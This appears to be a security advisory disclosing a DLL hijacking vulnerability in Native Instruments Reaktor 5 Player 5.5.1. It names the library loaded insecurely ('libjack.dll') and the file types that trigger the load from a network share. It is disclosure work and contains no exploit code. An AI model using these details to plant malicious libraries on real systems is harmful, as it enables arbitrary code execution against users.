 Native Instruments Reaktor 5 Player v5.5.1 Insecure Library Loading Vulnerability


 Vendor: Native Instruments GmbH
 Product web page: http://www.native-instruments.com
 Affected version: 5.5.1 (R10584) or 5.5.1.10584 (Standalone)

 Summary: REAKTOR 5 PLAYER is your free entry point to the award-winning and
 avant-garde audio world of REAKTOR 5 - the super-powerful modular sound studio
 that made Native Instruments famous.

 Desc: Reaktor 5 Player suffers from a DLL hijacking vulnerability, which could be
 exploited by remote attackers to compromise a vulnerable system. This issue is
 caused due to the application insecurely loading certain libraries ("libjack.dll")
 from the current working directory, which could allow attackers to execute arbitrary
 code by tricking a user into opening specific related files (.ens, .ism, .map, .mdl,
 .ntf, .rcc, .rcm, .rkplr and .ssf) from a network share.

 Tested on: Microsoft Windows XP Professional SP3 (English)
